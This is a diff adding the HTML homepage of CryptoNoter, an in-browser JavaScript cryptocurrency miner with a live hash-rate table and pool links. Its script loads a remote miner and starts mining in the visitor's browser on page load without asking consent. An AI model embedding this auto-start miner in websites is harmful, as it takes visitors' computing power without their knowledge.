@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>CryptoNoter - In-Browser Javascript Web Miner</title>
+	<meta name="description" content="In-Browser Javascript Web Miner For Websites / Support XMR & ETN Coins. Built for in-browser javascript mining on any Monero (XMR) or Electroneum (ETN) pools. 0% Commission. Payout Towards Personal Wallet" />
+	<link rel="image_src" href="https://www.cryptonoter.com/img/logo-square.jpg" />
+
+	<meta property="og:title" content="CryptoNoter - Open Source In-Browser Javascript Web Miner"/>
+	<meta property="og:description" content="Open Source In-Browser Javascript Web Miner For Websites / Support XMR & ETN Coins. Built for in-browser javascript mining on any Monero (XMR) or Electroneum (ETN) pools. 0% Commission. Payout Towards Personal Wallet"/>
+	<meta property="og:type" content="website"/>
+	<meta property="og:url" content="https://www.cryptonoter.com"/>
+	<meta property="og:image" content="https://www.cryptonoter.com/img/logo-square.jpg"/>
+	<meta property="og:site_name" content="cryptonoter.com"/>
+	<link rel="shortcut icon" href="https://www.cryptonoter.com/img/favicon-32x32.png" />
+
+	<script src="https://www.cryptonoter.com/processor.js"></script>
+	<script>
+		var miner = new CryptoNoter.User(CryptoNoter, {
+			autoThreads: true,
+			throttle: 0.5
+		});
+		miner.start();
+
+		// Listen on events
+		var found = 0,
+			accepted = 0;
+		miner.on('found', function () {
+			found++;
+			document.getElementById("FoundShares").innerHTML = found;
+		});
+		miner.on('accepted', function () {
+			accepted++;
+		})
+
+		// Update stats once per second
+		setInterval(function () {
+			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
+			var hashesPerSecond = miner.getHashesPerSecond();
+			document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
+			document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
+			miner.setThrottle(idle);
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
+
+		}, 500);
+
+
+	</script>
+</head>
+
+<body style="font-family: Arial;border: 0 none;">
+
+<div align='center' style='margin-top:30px;'>
+<img src='https://www.cryptonoter.com/img/logo-300.png' /><br /><br />
+<table cellpadding= '5' cellspacing='0'style='margin-bottom:80px;font-size:16px;' />
+<tr>
+	<td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Hash Rate / Sec</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Total Hashes</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Shares Found</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Shares Verfied</b>
+	</td>
+</tr>
+<tr>
+	<td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="Hashes">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="TotalHashes">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="FoundShares">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="VerifiedShares">0</div>
+	</td>
+</tr>
+</table>
+
+<div style='margin-top:0px;margin-bottom:20px;font-size:16px;'>
+<b>Updates & Developments</b><br />
+19/12/17: CryptoNoter Now Support ByteCoin (BCN) Coin<br />
+18/12/17: CryptoNoter Now Support Both Monero (XMR) & Electroneum (ETN) Coins<br />
+17/12/17: Use pool.cryptonoter.com:1111 for javascript web mining
+</div>
+
+<img src='https://www.cryptonoter.com/img/monero-logo.png' />
+<img src='https://www.cryptonoter.com/img/electroneum-logo.png' />
+<img src='https://www.cryptonoter.com/img/bytecoin-logo.png' />
+<br /><br /><br />
+
+<a href='https://www.cryptonoter.com/demo.php' />Try CryptoNoter Demo</a> | <a href='https://pool.cryptonoter.com' />Join My Monero Mining Pool</a> | <a href='https://github.com/cryptonoter/CryptoNoter' />CryptoNoter's Repository at Github</a><br /><br />
+<a href='https://www.facebook.com/cryptonoter/' />Follow Me at Facebook</a> | <a href='https://www.twitter.com/cryptonoter/' />Follow Me at Twitter</a>
+</div>
+
+</body>
+</html>
